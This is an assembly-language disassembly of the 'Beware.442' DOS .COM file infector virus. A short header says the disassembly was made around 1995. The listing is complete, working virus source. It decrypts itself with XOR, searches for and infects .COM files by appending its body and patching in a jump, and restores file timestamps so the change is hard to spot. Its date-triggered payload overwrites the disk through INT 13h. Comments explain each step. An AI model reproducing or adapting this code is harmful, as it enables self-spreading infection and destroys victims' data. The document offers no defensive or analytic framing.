; beware.442 dos .com infector with malicious payload.
; According to f-prot the binary was an exact copy.
; I disassembled this sometime around 1995.

.model tiny
.code
   code segment
      assume cs:code,ds:code
      org 100h

start:
	mov	di,115dh
	add	di,3
	lea	si,thrbyte[di]
	push	di
	mov	dx,si
	cld
	mov	cx,3
	mov	di,100h

locloop_1:
	lodsb
	xor	al,64h			; 'd'
	stosb
	loop	locloop_1

	pop	di
	call	crypt

	lea	dx,dta[di]
	mov	ah,1ah
	int	21h			; set dta

	lea	dx,cmask[di]
	mov	cx,3
	mov	ah,4eh
	int	21h			; find first file

	jc	infect
	jmp	short open
find:
	call	close
	mov	ah,4fh
	int	21h			; find next file
	jc	infect
open:
	lea	dx,[dta+1eh][di]
	mov	ax,3d02h
	int	21h			; open file

	jc	infect
	mov	bx,ax			; save handle
	cmp	cs:[data_9][di],4F43h
loc_4:
	je	find
	mov	ax,5700h
	int	21h
	mov	time[di],cx
	mov	date[di],dx		; save time and date

	mov	ah,3fh
	mov	cx,3
	lea	dx,thrbyte[di]
	int	21h			; buffer first 3 bytes

	jc	infect
	mov	cx,3
	lea	si,thrbyte[di]
	push	di
	mov	di,si

locloop_5:

	lodsb
	xor	al,64h
	stosb
	loop	locloop_5

	pop	di
	call	back
	jc	infect
	cmp	ax,0C00h
	jb	find
	sub	ax,3
	mov	data_12[di],ax
	mov	dx,ax
	call	front

	mov	ah,3fh
	mov	cx,1
	lea	dx,data_10[di]
	int	21h			; read a byte

infect:
	jc	loc_7
	mov	ah,data_10[di]
	cmp	ah,0e9h
	je	loc_4
	call	back
	call	crypt

	lea	dx,ds:[100h][di]
	mov	ah,40h
	mov	cx,1bah			; 442 bytes
	int	21h			; write our virus body

	xor	dx,dx
	call	front

	lea	dx,jcode[di]
	mov	ah,40h
	mov	cx,3
	int	21h			; write the jump opcode

	mov	dx,data_12[di]
	add	dx,4
	call	front

	lea	dx,data_12[di]
	mov	ah,40h
	mov	cx,2
	int	21h			; write jump address

	mov	ax,5701h
	mov	cx,time[di]
	mov	dx,date[di]
	int	21h			; set time and date

	call	close

	mov	dx,80h
	mov	ah,1ah
	int	21h

loc_7:
	call	payload
	mov	di,offset start
	push	di
	retn

front:
	mov	ax,4200h
	xor	cx,cx
	int	21h			; file pointer to bof
	retn
back:
	mov	ax,4202h
	xor	dx,dx
	xor	cx,cx
	int	21h			; file pointer to eof
	retn
close:
	mov	ah,3eh
	int	21h			; close file
	retn
crypt:
	lea	si,cmask[di]
	push	di
	mov	cx,31h
	mov	di,si

locloop_8:
	lodsb
	xor	al,80h
	stosb
	loop	locloop_8
	pop	di
	retn

copyright  db  'BEWARE ME - 0.01, Copr (c) DarkGraveSoft - Moscow 1990'

payload:
	mov	ah,2ah
	int	21h			; check date
	cmp	dl,1
	jne	nope
	cmp	al,1
	jne	nope			; is it monday the first?
	mov	ax,30fh
	mov	cx,1
	xor	dh,dh
	mov	dl,0
killit:
	int	13h			; start trashing the disk
	inc	ch
	jmp	killit

nope:
	retn


time      dw 34E0h
date      dw 1346h
thrbyte   db 8Fh,6Ah,0F4h
cmask     db 0AAh,0AEh,0C3h,0CFh,0CDh, 80h
;cmask    db '*.COM',0			; xor to 80h

dta       db 87h,0BFh,0BFh,0BFh,0BFh,0BFh,0BFh,0BFh,0BFh
          db 0C3h,0CFh,0CDh,83h,89h,80h,80h,80h,6Fh,80h,34h,0CCh
          db 0A0h,60h,0B4h,0C6h,93h,0E0h,91h,80h,80h

data_9    dw 0CDCDh

          db 0AEh,0C3h,0CFh,0CDh, 80h,0A0h
          db 0AEh,0C3h,0CFh,0CDh, 80h, 00h ;44 bytes for dta buffer
data_10   db 0dh
jcode     db 0e9h
data_12   dw 115dh

code  ends
      end  start
